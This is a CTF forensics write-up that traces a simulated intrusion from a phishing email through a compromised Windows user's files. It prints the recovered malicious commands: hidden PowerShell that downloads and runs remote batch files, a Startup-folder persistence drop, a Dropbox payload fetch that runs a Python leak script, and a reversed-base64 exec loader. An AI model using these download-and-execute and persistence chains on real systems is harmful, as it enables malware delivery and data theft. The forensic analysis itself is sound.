---
title: L3akCTF 2025 - BOMbardino crocodile. 
categories: [Writeups]
tags: [CTF]
image: /assets/thumbnails/L3ak_CTF_2025_Logo.png
---

## BOMbardino crocodile 

### Challenge Description 

```
APT Lobster has successfully breached a machine in our network, marking their first confirmed intrusion.
Fortunately, the DFIR team acted quickly, isolating the compromised system and collecting several suspicious files for analysis.
Among the evidence, they also recovered an outbound email sent by the attacker just before containment, I wonder who was he communicating with.
The flag consists of 2 parts.
```

### Introduction

Unzip the challenge files, we had been provided with 2 files,  `Welcome to the Brotherhood... 2025-05-10T20_24_11+08_00.eml` email file and `2025-05-30T125329_l3akctf` which is artifacts of our compromised machine.

### Analyze The EML File. 

Use the commmand `strings` on the `Welcome to the Brotherhood... 2025-05-10T20_24_11+08_00.eml` return encoded `base64` strings.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/d0957d1f-24b3-48fc-b01d-f0bb27770d1f" />

Next, proceed to manually decoding the text using `cyberchef` tool. Remove all the HTML and CSS tag from the original text so it more readable and easy to understand:

```
Greetings, Operative.
Your activity has not gone unnoticed. The time has come to proceed to the next level. 
Brotherhood protocols demand absolute discretion. As of 0400 hours, access has been provisioned.
ðŸ“© Secure your invite: ðŸ‘‰ https://discord.gg/a7SUtZXaP4.
Inside you will find leaks of people dumb enough to click on our brainrot exam.
ðŸ”’ Reminder: Do NOT share this link. Operatives who leak will be exiled. Again.
Stay cloaked. Stay corrupt
```

From the email messages, I've obtained their `Discord` channel which has been use to send the stolen data via Discord Bot. 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/0f3dac95-40b3-46b7-b4cf-a21a311698d0" />

There are 2 files contstanlty upload in the channel which is `pay2winflag.jpg.enc`, a `jpg` file that got encrypted. There might be some sort of `Key` use to decode it. Next is the `Password.zip` file, nothing interesting here. Move on to analye the artifacts.

### Analyze The Coompromised Machine Directory. 

There are 2 users in the machine which is `crustacean` and `public`. Each users got a decent amount of files, so I start with the `crustacean` first, maybe got a leads somewhere.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/78777920-05af-4c14-b745-46c954512211" />
 
After a few minutes wandering around in the folder, we got something quite interesting. In the `/Users/crustacean/Downloads` folder.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/ad7b8915-d40d-4c32-be44-4ea302e96ca4" />

From the `/Users/crustacean/Downloads` folder, we obtain 3 files. Analyzing each files return this conclusion: 

```
1. Lil L3ak secret plans for tonight.bat - Mysterious Unicode text, UTF-16, little-endian text, with very long lines (32767) with .bat extension
2. lil-l3ak-exam.pdf - just a brainrot quiz for new members format pdf file.
3. roblox-codes.txt - Txt files with bunch of custom made Roblox Gift Cards code.
```

### Analyze "Lil L3ak secret plans for tonight.bat" File 

Using the `strings` command on the `Lil L3ak secret plans for tonight.bat` for a better view. The contents inside begin with the word `echo` which a command use to writes character strings to standard output, followed with a bunch of gibberish unknown brainrot text. But its not stop there, in forensic, everything matter even a small things.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/890b620b-b9e3-4345-808c-fa3a5d147133" />

Keep scrolling down, digging up the `Lil L3ak secret plans for tonight.bat.bat` file I found an interesting `command` hidden in the gibberish text. 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/57dd7bd0-0906-4708-be41-1de0700194cb" />

Let me pull it out for you: 

```
start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat'
-OutFile '%TEMP%\temp.bat'; Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden"
```

So basically, what the command do is: 

```
`start /min cmd /c`: launches a minimized Command Prompt that runs a PowerShell command

`Powershell -WindowStyle Hidden -Command`: Launches PowerShell in a hidden window to nsures the PowerShell window is not visible to the user and prepare to execute next command. 

`Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat'`: Use to download a file from the specified URL.

`-OutFile '%TEMP%\temp.bat'`: Saves the downloaded file in the current users `/%temp/` folder and name as `temp.bat`

`Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden`: start the process of the recent save file in hidden windows. 
```

### Analyze "Temp.bat" File. 

Previous `command` found lead to the `temp.bat` in `Temp` folder in the current users  `crustacean/Appdata/Local/Temp`. Read the contents using `strings` commands once again.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/f978417a-fe97-4636-82e3-3dba6b25654a" />

Same as previous file, the `temp.bat` start with `echo` command followed by gibberish text. Analyze the full text and we find another interesting `command` hidden in the middle of the gibberish text.

<img width="1901" height="258" alt="image" src="https://github.com/user-attachments/assets/537c887f-91f0-4772-9916-483e4987b923" />

Let me pull it out for you again: 

```
start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/bluecrustacean/oceanman/raw/main/ud.bat', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat');
(New-Object -TypeName System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym&st=mtz77hlx&dl=1',
'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document');
Start-Sleep -Seconds 60; C:\\Users\\Public\\Document\\python.exe C:\Users\Public\Document\Lib\leak.py; Remove-Item 'C:/Users/Public/Document.zip' -Force" && exit
```
What the command do? here: 

```
`start /min powershell.exe -WindowStyle Hidden -Command`: Launches PowerShell in a hidden, minimized window to execute the full command chain silently.

`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;`: Ensures PowerShell uses TLS 1.2 for secure HTTPS connections, required by many modern servers.

`(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/bluecrustacean/oceanman/raw/main/ud.bat', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat');`: Downloads a batch file from GitHub and saves it into the user's Startup folder to achieve persistenceâ€”so it runs automatically at system startup.

`(New-Object -TypeName System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym&st=mtz77hlx&dl=1', 'C:\\Users\\Public\\Document.zip');`: Downloads a ZIP file (T602.zip) from Dropbox and saves it to a public folder accessible to all users.

`Add-Type -AssemblyName System.IO.Compression.FileSystem;`: Loads the .NET assembly needed to extract ZIP files using PowerShell.

`[System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document');`: Extracts the contents of the ZIP file into the C:\Users\Public\Document\ directory.

`Start-Sleep -Seconds 60;`: Pauses execution for 60 secondsâ€”likely to let files extract or system settle before running the next step.

`C:\\Users\\Public\\Document\\python.exe C:\Users\Public\Document\Lib\leak.py;`: Runs a Python script (leak.py) using a bundled python.exe interpreterâ€”likely to execute malicious actions such as stealing data.

`Remove-Item 'C:/Users/Public/Document.zip'` : Deletes the original ZIP archive to clean up traces of the operation.

` -Force  && exit`: Closes the command shell after everything is executed.
```

From above executed command, the downloaded zip file was extracted in `Public` users directory. And run a python script located in `C:\Users\Public\Document\Lib\leak.py`

### Analyze "leak.py" File. 

Navigate to the python script location `C:\Users\Public\Document\Lib\leak.py`, used `strings` to read the file content.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/55a7c671-4cf2-4f3f-b1a2-b1c4f5deb457" />

Once again, result return was another bunch of gibberish text, but this one quiet different cause the hidden commands has been encrypted using certain encryption method. Let discuss: 

```
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=kSKnoFWoxWW5d2bYl3avlVajlDUWZETjdkTwZVMs9mUyoUYiRkThRWbodlWYlUNWFDZ3RFbkBVVXJ1RXtmVPJVMKR1Vsp
1Vj1mUZRFbOFmYGRGMW1GeoJVMadlVYxmbSJjThN2RxMFVF9WeZRlTr1UMSllUtBHWZVlSxV1aW9UTWplcX1WNYRmM0VUWxI0UhFjShVlaKdlTHdGeWxGbHZ1a180VrpFakBjWzZ1a5cUTWJ1VXxmVPd1RSJnVxgWY
iVUMM90VxUlVYJkVWJj............................(other longs how many bytes of encoded text that foking long)
```

Above command defines:

```
a lambda (anonymous function) _ that:

Takes an input string `__`

Reverses it with `__[::-1]`

Decodes it using Base64 `(b64decode)`

`__import__('base64')` is a sneaky way to import the base64 module without using the normal import keyword.
```

Here the `Malicious script` has been encrypt using the `base64` and reversed to make it more complex. Using `cyberchef`, bake the encrypted script using `reverse` and `base64`. Repeat the same step multiples time until we got the original text. 

```
```

From the original script, I've obtained a few keypoint: 

```

This function shows the "" key was use to encrypt the jpg file that we found in the discord channel. `
```



### Obtained Flag First Part 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/e07b8fe8-92f8-4f91-9337-226037416d16" />


### Obtained Flag Second Part

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/1a4a8f75-eaf2-42b2-a913-b73f6fa98ff2" />














